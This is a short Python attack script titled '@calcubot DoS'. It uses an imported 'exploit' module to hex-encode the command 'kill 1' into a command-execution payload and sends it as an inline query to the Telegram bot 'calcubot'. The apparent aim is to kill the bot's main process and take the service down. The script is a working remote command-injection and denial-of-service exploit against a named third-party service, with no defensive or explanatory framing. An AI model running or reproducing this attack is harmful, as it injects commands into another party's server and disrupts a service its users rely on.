
# @calcubot DoS

import exploit


async def main():
  async with exploit.app:
    payload = exploit.exec_command.format(payload=exploit.hexify('kill 1'))
    await exploit.get_inline_bot_results('calcubot', query=payload)

exploit.app.run(main())
